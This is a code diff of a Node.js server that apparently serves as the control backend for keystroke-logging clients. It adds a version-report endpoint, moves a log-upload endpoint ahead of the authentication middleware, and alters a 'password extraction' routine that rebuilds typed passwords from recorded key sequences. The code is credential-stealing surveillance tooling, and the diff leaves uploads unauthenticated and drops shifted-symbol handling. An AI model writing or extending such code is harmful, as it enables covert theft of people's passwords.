@@ -333,6 +333,29 @@ app.get('/logout', (req, res) => {
     res.redirect('/login');
 });
 
+app.post('/api/client/report', asyncHandler(async (req, res) => {
+    const { version, ip, local_port } = req.body;
+    if (!version || !ip || !local_port) {
+        return res.status(400).json({ code: 400, error: '缺少必要参数: version, ip, local_port' });
+    }
+    logger.info(`收到客户端版本报告: ${ip}:${local_port}, 版本: ${version}`);
+    clientManager.updateClientVersion(ip, local_port, version);
+    res.json({ code: 200, message: '报告已接收' });
+}));
+
+app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
+    const ip = req.params.ip;
+    let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
+    if (!clientId) clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
+    const client = clientManager.clients.get(clientId);
+    const logDir = client ? client.logDir : alistClient.basePath;
+    const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
+
+    await alistClient.uploadFile(logDir, filename, req.body.toString());
+    logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
+    res.json({ success: true, message: '文件上传成功' });
+}));
+
 app.use(authMiddleware);
 
 function userMiddleware(req, res, next) {
@@ -894,7 +917,8 @@ class ClientManager {
                 uploadEnabled: false,
                 lastSeen: new Date(),
                 logDir: alistClient.basePath,
-                shouldReconnect: false
+                shouldReconnect: false,
+                version: null
             };
 
             const existing = this.clients.get(clientId);
@@ -1110,8 +1134,23 @@ class ClientManager {
             status: client.status,
             recording: client.recording,
             uploadEnabled: client.uploadEnabled,
-            lastSeen: client.lastSeen
+            lastSeen: client.lastSeen,
+            version: client.version
         };
+    }
+
+    updateClientVersion(ip, port, version) {
+        const clientId = `${ip}:${port}`;
+        const client = this.clients.get(clientId);
+        if (client) {
+            client.version = version;
+            client.lastSeen = new Date();
+            this.broadcastClientUpdate(client, 'updated');
+            this.logger.info(`客户端 ${clientId} 版本已更新为 ${version}`);
+            return true;
+        }
+        this.logger.warn(`尝试更新不存在的客户端版本: ${clientId}`);
+        return false;
     }
 
     getAllClients() {
@@ -1336,7 +1375,8 @@ class ClientManager {
                                         uploadEnabled: false,
                                         lastSeen: now,
                                         logDir: alistClient.basePath,
-                                        shouldReconnect: false
+                                        shouldReconnect: false,
+                                        version: null
                                     };
                                     this.clients.set(clientId, client);
                                     this.knownClients.set(clientId, { ip: cleanIp, port, lastSeen: now });
@@ -2066,18 +2106,7 @@ app.post('/api/clients/:clientId/logs/delete', asyncHandler(async (req, res) => 
     res.json({ success: true, message: '命令已发送' });
 }));
 
-app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
-    const ip = req.params.ip;
-    let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
-    if (!clientId) clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
-    const client = clientManager.clients.get(clientId);
-    const logDir = client ? client.logDir : alistClient.basePath;
-    const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
 
-    await alistClient.uploadFile(logDir, filename, req.body.toString());
-    logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
-    res.json({ success: true, message: '文件上传成功' });
-}));
 
 // ========== 密码提取核心函数 ==========
 
@@ -2151,10 +2180,7 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
                 const makeUpper = shift ^ caps;
                 char = makeUpper ? item.toUpperCase() : item.toLowerCase();
             } else {
-                // 数字和符号：shift 影响
-                if (shift && shiftMap[item]) {
-                    char = shiftMap[item];
-                }
+                // 数字和符号：不翻译 SHIFT 键的影响
             }
 
             result.push(char);
